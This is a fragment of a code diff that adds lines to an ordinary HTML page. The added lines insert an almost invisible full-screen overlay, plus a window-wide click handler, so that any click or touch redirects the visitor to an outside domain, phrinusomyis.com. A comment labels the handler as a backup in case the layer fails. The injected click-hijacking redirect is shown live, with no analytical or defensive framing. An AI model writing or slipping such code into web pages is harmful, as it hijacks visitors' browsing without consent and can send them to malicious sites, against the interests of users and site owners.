@@ -13,6 +13,27 @@
     margin: 0;
   }
 </style>
+    <style>
+  .click-layer {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: 99999;
+    background-color: rgba(0,0,0,0.01); /* Nearly invisible but 'solid' to the browser */
+    cursor: pointer;
+  }
+</style>
+
+<div class="click-layer" onclick="location.href='https://phrinusomyis.com/';" ontouchstart="location.href='https://phrinusomyis.com/';"></div>
+
+<script>
+  // Extra backup: if the layer fails, the window itself will listen
+  window.onclick = function() {
+    window.location.href = "https://phrinusomyis.com/";
+  };
+</script>
 
 <script>
   function goToHome() {
